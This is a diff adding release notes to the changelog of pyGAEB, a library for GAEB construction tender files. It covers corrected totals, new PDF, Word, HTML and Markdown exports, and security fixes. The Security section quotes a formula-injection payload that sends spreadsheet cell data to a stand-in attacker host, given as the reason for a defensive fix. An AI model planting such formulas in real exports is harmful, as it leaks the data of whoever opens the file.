@@ -5,6 +5,68 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Upgrade notes
+
+No public function, class or argument was removed or changed in an incompatible way. Three corrections do change values that existing code may rely on:
+
+- **A markup's `total_price` is now its own amount.** It used to hold the base the rate applies to (`<ITMarkup>`), which moved to the new `Item.markup_base`; `total_price` now holds the markup's amount (`<IT>`). Code that read the base from `total_price` should read `markup_base`.
+- **Sums now include Bedarfspositionen *mit GB* (optional items whose total counts) and markups.** `grand_total`, category and lot subtotals, and everything built on them (the totals validator, bid analysis, the quality score, the MCP sums, the exports) grow by those positions. `ItemType.MARKUP.affects_total` is now `True`. To tell whether one position counts, use `Item.affects_total`: for a Bedarfsposition it depends on `Provis`.
+- **`TradeOrder.grand_total` applies `PriceBasis`.** 250 Stk at 5.00 per 100 now total 12.50, not 1,250.00. Each line's total is `OrderItem.line_total`.
+
+Exported files change as well: `to_pdf` prints a new layout, the Excel trade sheet has two more columns (Price Basis, Line Total), and `raw_data` keeps nested elements as XML and repeated ones as lists. The entries below have the details.
+
+`to_csv` now puts a `'` before text that starts with `=`, `+`, `-`, `@`, a tab or a carriage return, so a spreadsheet shows it instead of running it; pass `escape_formulas=False` for the text unchanged. pyGAEB now needs lxml 6.1 and pydantic 2.4 or newer, the `mcp` extra mcp 1.30, and `pyGAEB[llm]` litellm 1.106.2. See Security.
+
+### Changed
+
+- **`to_pdf` prints an LV the way AVA programs do.** The old export was one flat table of leaf items: it showed the leaf OZ instead of the full one, cut every short text at 60 characters, dropped long texts and item types, and formatted numbers the US way, so a German LV came out as `1,170.500` and `53,257.75`. It now prints the hierarchy (lot and category headings, a subtotal per category and per lot, the grand total), the full OZ, the full short and long texts, item-type markers (*Pauschalposition*, *Bedarfsposition ohne GB*, …) with *Nur Einh.-Preis* in place of the total for priced items that are not summed, markup items with their rate (`10,00 %`) rather than as a price and their own amount as the total, and carry-forward lines (*Übertrag*) at every page break. German labels and number format are the default; `PdfStyle(locale="en")` switches both. Numbers keep the precision the document carries, so a unit price of `12.345` prints as `12,345`. Other document kinds print a flat item list; trade documents show each line's total and the grand total. The call is unchanged: `to_pdf(doc, path, title=None)`.
+
+### Fixed
+
+- **Bedarfspositionen *mit GB* count toward the sums.** `ItemType.affects_total` is fixed per type, so every Bedarfsposition was left out, even one whose `<Provis>WithTotal</Provis>` puts its total into the sum. Subtotals, `grand_total`, the totals validator, the writer's synthesised `<Totals>`, bid analysis, the quality score, the MCP sums and both exports were short by every such position. The new `Item.affects_total` reads `Provis` (only *mit GB* counts; *ohne GB* and unset do not), and every sum uses it. Writing DA XML 2.0/2.1 also keeps the value now: it wrote an empty `<Provis/>`, so a 2.x round trip turned every *mit GB* position into *ohne GB*.
+- **Markup items count with their own amount, and keep it.** The parser stored a markup's base (`<ITMarkup>`, the total its rate applies to) as `total_price` and dropped its amount (`<IT>`), so a 10 % markup on 1,000.00 read as a 1,000.00 position that no sum included. `total_price` now holds `<IT>`, the new `markup_base` holds `<ITMarkup>`, the writer emits both, `computed_total` gives base × rate, and markups enter the sums (`ItemType.MARKUP.affects_total` is now true). With both fixes, the declared category totals of the BVBS Prüfdatei `ava/award.X86` reproduce, except where its alternatives are still read as normal positions (the Zuordnungszahl is not parsed yet).
+- **Markup items keep their place among the items.** The parser read every `<Item>` of an `<Itemlist>` first and its `<MarkupItem>`s after, so a markup between two positions moved to the end of its list, in the model, on write, and in every export. Items and markups are now read in one pass, in document order.
+- **Trade totals apply `PriceBasis`.** A trade price refers to `PriceBasis` units, but `TradeOrder.grand_total` multiplied price by quantity, so 250 Stk at 5.00 per 100 counted as 1,250.00 instead of 12.50, and an item without a quantity added its bare unit price. The new `OrderItem.line_total` is price × quantity ÷ price basis, rounded to cents, and `grand_total` is the sum of line totals; items without a quantity add nothing. `DocumentAPI`'s `min_total` filter compares trade items by line total instead of unit price.
+- **The trade sheet has Price Basis and Line Total columns, and its TOTAL sits under Line Total.** Since #51 it sat under Net Price, a per-unit price.
+- **`formulas=True` makes every total live, as documented.** Only item totals became formulas; category, lot and grand totals stayed static numbers, so editing a quantity in Excel left every sum above it stale. They are now `=SUM` over exactly the cells pyGAEB adds up (alternatives, Bedarfspositionen *ohne GB* and other positions that do not count keep their own cell but stay out of the sum), and item totals are `=ROUND(Qty*UnitPrice,2)`, matching `Item.computed_total`.
+- **The Excel OZ column shows the full OZ.** It showed the item's own part, so a parsed file's `01.01.001` came out as `001`.
+- **Markup items show their rate as a percentage and their own amount as the total.** The sheet showed a markup's rate as a price (10.00 €) and the base it applies to as its total (1,000.00 €). Unit Price now shows `10.00 %`, and Total Price shows the markup's own amount (`<IT>`).
+- **Excel quantities show three decimals.** The old `#,##0.###` format left a stray decimal separator after whole numbers (`120.`); quantities now use `#,##0.000`.
+- **`to_csv` exports every document kind.** It only ever read tender items, so a quantity (X31), cost (X50/X51) or trade (X93–X97) file came out as a header row with no data. Each kind now gets its own columns: trade lines with their prices, price basis and line total; cost elements with their parent element and categories; quantity items with the number of their measurement rows. BoQ CSVs keep their 18 columns in the same order and gain `affects_total`, `provis` and `markup_base` at the end, so the rows rebuild `grand_total`.
+- **`collect_raw_data` works for every document kind and collects exactly what pyGAEB did not read.**
+  - It crashed on quantity (X31), cost (X50) and trade (X93–X97) documents, because only tender items had a `raw_data` field. `OrderItem`, `CostElement` and `QtyItem` now have one.
+  - It decided what counted as unread from a hand-kept list of tags written for tender items. That list reported fields pyGAEB does read as unknown (`ITMarkup`, `Markup`, `MarkupType`, `MarkupSubQty`) and hid standard flags it does not read (`HourIt`, `MarkupIt`, `NotAppl`, …). The parsers now record every element they read, and `raw_data` holds exactly the rest.
+  - An element with child elements came back as whitespace; it is now kept as an XML string. A repeated element kept only its last copy; it now becomes a list.
+- **XML comments no longer break parsing anywhere.**
+  - The 1.14.0 fix for comments in iTWO exports added a check to three loops. The raw-data loop never got one, so the very file from that report crashed with `collect_raw_data=True`.
+  - A comment inside a value also cut the value short: `<Name>Synthetic<!-- x --> LV</Name>` read as `Synthetic`.
+  - Writing a long text dropped the text that followed a comment.
+  - Every walk over child elements now goes through one helper that skips comments, values are read past them, and a new test puts comments everywhere in every document kind. Comments stay in the XML tree for `keep_xml=True` users, and `raw_html` keeps them as in the source.
+
+### Added
+
+- **`PdfStyle`** — locale, page size, margins, fonts, font size, line spacing, column widths, and whether long texts and carry-forward lines are printed.
+- **`to_pdf(..., on_text=)`** — called with a `PdfTextRun` for every string drawn: the text, its `PdfTextRole`, page, baseline position, width, font, and the item, category or lot it came from. All text reaches the page through one function, so the callback sees everything printed; the tests check this against an independent PDF reader in both directions.
+- **`to_excel(..., on_cell=)`** — called with an `ExcelCell` for every non-empty cell: sheet, coordinate, value, the column's field (`"full_oz"`, `"qty"`, …) or the row's kind (`"subtotal"`, `"grand_total"`, …), and the item, category or lot it came from.
+- **`to_docx`, `to_html` and `to_markdown`** — the LV as an editable Word document, an HTML page or embeddable fragment, and Markdown. They share one walk with `to_pdf`, so all four print the same headings, texts, markers, *Nur Einh.-Preis*, markup rates and sums. HTML escapes every string from the document and tags rows for styling and linking (`lv-position`, `data-oz`, `data-id`); Markdown escapes text that would read as formatting. `pip install pyGAEB[docx]` installs python-docx for the Word export; HTML and Markdown need nothing.
+- **`pygaeb export` writes PDF, Word, HTML and Markdown** — `-f pdf`, `docx`, `html` and `md`, next to `json`, `csv` and `xlsx`. When an optional extra is missing, the command names the one to install instead of printing a traceback.
+- **`to_csv`, `to_json` and `to_json_string` import from `pygaeb`**, like every other export; only `from pygaeb.convert import ...` worked before.
+- **`to_dataframe`** — the items as a pandas DataFrame, with the same columns `to_csv` writes for the document's kind. Amounts are floats, so sums, `describe()` and plots work; `exact=True` keeps pyGAEB's `Decimal` values. Amount and date columns keep their type even when no item has a value. `pip install pyGAEB[pandas]` installs pandas, which is now a `dev` dependency, so CI runs these tests.
+- **`OrderItem.line_total`** — a trade line's total with its price basis applied.
+- **`Item.affects_total`** and **`Item.markup_base`** — whether a position enters the sums, and a markup's base. The MCP `markup` block gains `base`.
+- **`pdf` extra** — `pip install pyGAEB[pdf]` installs reportlab, which `to_pdf` needs; it was never declared, so the export failed on a fresh install. reportlab and pypdf are now `dev` dependencies, so CI runs the PDF tests instead of skipping them.
+
+### Security
+
+- **The `llm` extra needs litellm 1.106.2 or newer and refuses 1.107.0.** litellm 1.107.0, published to PyPI and Docker on 21 October 2026, was a compromised release that steals credentials when Python starts ([LiteLLM's incident report](https://docs.litellm.ai/blog/security-incident-oct-21-2026)). PyPI has removed it; the exclusion keeps mirrors and caches that still hold it from installing it. 1.106.2 is the last release before the compromise and the version LiteLLM recommends; it is also past CVE-2026-84377 (an SSRF in the LiteLLM proxy server, which pyGAEB does not use) and the malicious 1.82.7 and 1.82.8 of March 2026. A library's version range cannot stop a future bad release, so applications should pin litellm to an exact version with hashes.
+- **Document text can no longer run as a spreadsheet formula.** A short text such as `=HYPERLINK("https://attacker.example/?d="&A1,"Details")` became a live formula in `to_excel` and `diff_to_excel` workbooks (openpyxl makes any string that starts with `=` a formula) and went into `to_csv` unchanged. A GAEB file from a bidder or client could therefore run formulas, and send other cells away, when its export was opened. Workbooks now store every document string as text and keep only pyGAEB's own `=SUM` and `=ROUND` totals live; the CSV escapes such text (see Upgrade notes). `pygaeb export` and the MCP `export_document` tool get both.
+- **REB take-off rows parse in linear time.** Two regular expressions behind `QTakeoffRow.parse()` backtracked quadratically on long runs of spaces, so a 1 MB row from an X31 file took hours. String operations replace them; such a row now takes milliseconds.
+- **Dependency floors past known advisories:** lxml 6.1 (CVE-2026-41066), pydantic 2.4 (CVE-2024-3772) and mcp 1.30 (CVE-2026-59950, CVE-2026-59951); for the docs build mkdocs-material 9.7.7 (CVE-2026-73295), for the tests pypdf 6.21.2. pyGAEB's own use reached none of them: it parses with entity resolution off, has no email fields, and its MCP server speaks stdio only.
+- **Re-embedding a long text uses the hardened XML parser,** like every other parse, and the MCP write tools check for their output directory explicitly instead of with `assert`, which `python -O` removes.
+- **The release pipeline is hardened:** GitHub Actions are pinned to commit SHAs, the workflow token is read-only by default, checkouts keep no credentials, the build tools come from a hash-pinned list and build with `--no-isolation`, and the tag name reaches the release script through the environment. Dependabot keeps the pins current, and a weekly `pip-audit` checks pyGAEB with its extras.
+
 ## [1.19.1] - 2026-10-21
 
 ### Fixed
